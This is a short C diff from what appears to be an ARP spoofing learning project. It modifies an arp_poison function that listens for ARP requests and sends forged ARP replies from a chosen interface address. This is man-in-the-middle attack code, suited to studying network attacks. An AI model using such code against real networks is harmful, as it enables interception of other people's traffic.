@@ -5,6 +5,9 @@ void	arp_poison(t_malcom *mstruct)
 	struct in_addr ipsrc, ipdst;
 	t_arp_pkt pkt;
 
+	t_sockaddr_ll send_from_addr;
+	get_mac_from_ifname(&send_from_addr, mstruct->dst_host.ifa_name);
+
 	while (TRUE) {
 		if (recv_arp(&pkt, mstruct) < 0)
 			continue ;
@@ -28,11 +31,12 @@ void	arp_poison(t_malcom *mstruct)
 	}
 
 	t_com_devices devs;
+
 	ft_memcpy(devs.tha, pkt.ar_sha, ETH_ALEN);
 	ft_memcpy(devs.tip, pkt.ar_sip, IP_ALEN);
 
 	ft_memcpy(devs.sha, mstruct->dst_host.sock_addr_ll.sll_addr, ETH_ALEN);
 	ft_memcpy(devs.sip, &(ipdst.s_addr), IP_ALEN);
 	
-	send_arp(ARPOP_REPLY, mstruct, &devs, &(mstruct->dst_host.sock_addr_ll));
+	send_arp(ARPOP_REPLY, mstruct, &devs, &send_from_addr);
 }
